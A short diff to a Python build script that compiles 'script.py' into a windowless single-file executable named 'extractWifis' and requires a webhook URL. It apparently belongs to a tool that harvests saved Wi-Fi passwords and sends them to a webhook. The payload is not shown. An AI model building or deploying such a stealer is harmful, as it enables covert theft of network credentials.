@@ -4,11 +4,12 @@ from base64 import b64encode
 import subprocess
 
 def compile():
-    cmd = ['cmd', '/c' ,'pyinstaller', 'script.py', '--onefile', '--noconsole', '--icon=icon.ico', '--name=extractWifis']
+    cmd = ['cmd', '/c' ,'pyinstaller', 'script.py', '--onefile', '--noconsole', '--icon', 'icon.ico', '--name', 'extractWifis', '--log-level', 'ERROR']
+    print("Building..\n")
     subprocess.run(cmd,stdout=subprocess.DEVNULL)
 
 def build():
-    if len(sys.argv != 2)
+    if len(sys.argv) != 2:
         print(" Usage:\tpython3 build.py <webhook_url>")
         print("Bye...\n")
         sys.exit(1)
